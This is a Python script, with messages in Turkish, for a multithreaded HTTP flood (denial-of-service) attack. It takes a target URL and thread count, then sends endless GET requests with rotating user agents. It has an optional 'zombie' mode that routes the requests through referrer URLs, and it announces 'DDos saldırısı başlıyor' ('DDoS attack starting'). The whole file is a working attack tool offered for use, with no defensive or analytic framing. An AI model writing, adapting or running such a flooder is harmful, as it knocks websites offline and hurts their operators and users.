import argparse
import requests
import threading
import random
import os
from tools import colorprint
from tools import useragent
from tools import get_refers
parser = argparse.ArgumentParser()
parser.add_argument('--threads', type=int, required=True)
parser.add_argument('--url', type=str, required=True)
args = parser.parse_args()

count = 0
def yazitura():
    #hebele = ["random","direct"]
    hebele = ["direct"]
    return random.choice(hebele)

def istek():
    global count 
    while(True):
        count +=1
        if(count==10):
            os.system('cls' if os.name == 'nt' else 'clear')
            colorprint.logo_screen()
            
        url = args.url
        user_agent = {'User-agent': useragent.get_useragent()}
        if(yazitura() =="direct"):
            try:
                response = requests.get(url,headers=user_agent,timeout=15)
                colorprint.colorprint(f"İstek Tamamlandı, Atak türü: direkt, istemci yanıtı : {response.status_code} {url}")
            except:
                colorprint.colorprint(f"istemci yanıt vermiyor. {url}","v")
        else:
            try:
                refer = get_refers.random_refers()+url
                response = requests.get(refer,headers=user_agent,timeout=15)
                colorprint.colorprint(f"İstek Tamamlandı, Atak Türü:Zombi ,istemci yanıtı : {response.status_code} {url}")
            except:
                colorprint.colorprint(f"istemci yanıt vermiyor. {url}","v")
def basla():
    threads = []
    for i in range(int(args.threads)):
        t = threading.Thread(target=istek)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

colorprint.colorprint(f"DDos saldırısı başlıyor:{args.url}")
basla()
